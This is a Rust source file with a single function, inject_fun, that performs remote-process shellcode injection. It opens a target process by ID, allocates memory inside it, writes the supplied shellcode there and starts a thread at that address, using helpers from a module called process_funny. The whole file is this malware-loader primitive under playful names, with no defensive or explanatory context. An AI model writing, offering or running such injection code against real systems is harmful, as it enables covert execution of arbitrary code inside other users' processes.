use crate::process_funny::*;
use std::mem::transmute;
use std::io::Error;
use std::os::raw::c_void;

pub fn inject_fun(process_id: u32, shellcode: &[u8])-> Result<(), Error> {
    unsafe {

 
        let process_handle = open_process(&process_id)?;


        let base_address = allocate_memory(&process_handle, &shellcode.len());

        let _success = write_in_memory(
            &process_handle,
            base_address,
            shellcode.as_ptr() as *const c_void,
            &shellcode.len(),
        )?;

 

        let startaddress = Some(transmute(base_address));
 
        let _thread_handle = create_thread_execution(&process_handle, startaddress)?;
    }
    Ok(())
}